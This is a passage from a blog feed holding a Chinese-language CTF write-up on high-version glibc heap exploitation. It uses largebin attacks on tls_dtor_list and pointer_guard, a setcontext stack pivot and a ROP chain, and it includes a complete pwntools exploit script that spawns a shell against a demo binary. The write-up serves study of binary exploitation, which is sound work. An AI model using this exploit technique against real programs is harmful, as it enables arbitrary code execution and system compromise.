class="built_in">printf</span>(<span class="string">&quot;libc_base:%p\n&quot;</span>, libc_base);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            add();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            delete ();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            edit();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            end();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>首先泄露libc基址和heap基址，这里libc基址我直接在主程序中打印出来了，其实也可以通过<code>show largebin</code>来获得。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x428</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>)  <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)  <span class="comment">#4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x16b0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123022279.png"
-                      class=""
-                >
-
-<p>然后free掉一个和0x430那个larginbin属于一个大小范围的，但又比0x430小的chunk3，修改以及在largebin中的那个chunk的bk_nextsize域为<code>target_addr-0x20</code>，然后申请一个大chunk，从topchunk分配，并把chunk3置入largebin，触发largebin attack，往<code>target_addr</code>写chunk3的地址。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(tls_dtor_list-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>)        <span class="comment">#trigger largebin attack 1</span></span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123458788.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123536544.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128123654313.png"
-                      class=""
-                >
-
-<p>然后故技重施，再来次largebin attack改<code>tcbhead_t-&gt;pointer_guard</code>为一个我们知道的堆地址，这里我们可以先把<code>fake_dtor_list-&gt;next</code>改成一个可控的堆区域先，方便后面栈迁移。这里<code>fs_base</code>的地址相对于libc基址是固定的，计算一下就可以得出。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0x1af0</span>))    <span class="comment">#next=chunk2-&gt;data</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x4f8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x600</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(fs_base+<span class="number">0x30</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x600</span>)        <span class="comment">#trigger largebin attack 2</span></span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241127183520245.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124109770.png"
-                      class=""
-                >
-
-<p>这里的key就是我们写到<code>fs:0x30</code>的地址，最后利用chunk2把chunk3（fake_dtor_list）的func域改为加密后的<code>setcontext+61</code>，由于我们之前把next域设置为了chunk2的data域的地址，所以这里rdx就会指向chunk2的data域，这样我们在改chunk2时，设置rsp为一个可写地址，rbp为栈迁移目标地址-8，rcx为<code>leave;ret</code>地址，最终就能栈迁移到我们可控的堆段上，这里我们迁移到了chunk8的data域，chunk8写rop链即可。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f2e7</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line"></span><br><span class="line">key = heap_base + <span class="number">0x3260</span></span><br><span class="line">chunk8 = heap_base + <span class="number">0x3770</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x78</span> + p64(chunk8-<span class="number">8</span>)  <span class="comment">#rbp</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(heap_base+<span class="number">0x5000</span>)+p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x420</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(((setcontext+<span class="number">61</span>)^key)&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x428</span>,payload)  </span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi_ret)+p64(chunk8+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_r12_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)+p64(syscall)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x58</span>,rop)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">end()</span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124932862.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128124955592.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128125025834.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/11/28/tls-dtor-list%E5%8A%AB%E6%8C%81exit%E6%89%A7%E8%A1%8C-%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B9%8B%E4%B8%80/image-20241128125109454.png"
-                      class=""
-                >
-
-<p>exp</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;pwn.challenge.ctf.show&quot;,28310)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt;&gt;&quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;libc_base:&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x80e50</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">tls_dtor_list = libc_base - <span class="number">0x2918</span></span><br><span class="line">fs_base = libc_base - <span class="number">0x28c0</span></span><br><span class="line"><span class="comment"># fs_base = libc_base - 0x3260</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000004da83</span></span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x428</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>)  <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)  <span class="comment">#4</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x16b0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(tls_dtor_list-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x500</span>)        <span class="comment">#trigger largebin attack 1</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0x1af0</span>))    <span class="comment">#next=chunk2-&gt;data</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x4f8</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x600</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(fs_base+<span class="number">0x30</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x600</span>)        <span class="comment">#trigger largebin attack 2</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f2e7</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000029db4</span></span><br><span class="line"></span><br><span class="line">key = heap_base + <span class="number">0x3260</span></span><br><span class="line">chunk8 = heap_base + <span class="number">0x3770</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x78</span> + p64(chunk8-<span class="number">8</span>)  <span class="comment">#rbp</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(heap_base+<span class="number">0x5000</span>)+p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x420</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(((setcontext+<span class="number">61</span>)^key)&lt;&lt;<span class="number">0x11</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x428</span>,payload)  </span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi_ret)+p64(chunk8+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_r12_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rax_ret)+p64(<span class="number">0x3b</span>)+p64(syscall)+<span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x58</span>,rop)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">end()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>heap</tag>
       </tags>
   </entry>
   <entry>
